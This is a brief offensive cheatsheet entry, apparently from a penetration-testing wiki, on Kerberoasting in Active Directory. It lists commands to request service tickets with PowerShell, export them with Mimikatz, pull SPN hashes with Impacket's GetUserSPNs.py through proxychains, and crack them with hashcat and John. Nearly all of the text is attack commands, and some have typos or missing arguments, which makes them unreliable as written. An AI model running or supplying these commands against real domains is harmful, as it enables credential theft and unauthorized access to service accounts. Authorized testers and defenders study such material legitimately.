---
id: a418333a-1938-4894-8147-27932d6655c2
name: Mimikatz Kerberoasting
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:07.930544+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Mimikatz Kerberoasting

**Command** ([[Command]]):

```bash
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.com"

```

Use mimikatz to export SPN Tikets

**Command** ([[Export Kerberos List]]):

```bash
mimkatz kerberos::list /export

```

**Command** ([[Export SPN tickets]]):

```bash
Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'

```

Output hashes in the correct format for John, Proxychains & Beacon

**Command** ([[Impacket method of extracting SPN tickets]]):

```bash
proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip -outputfile

```

**Command** ([[Cracking the hashes]]):

```bash
hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist=

```
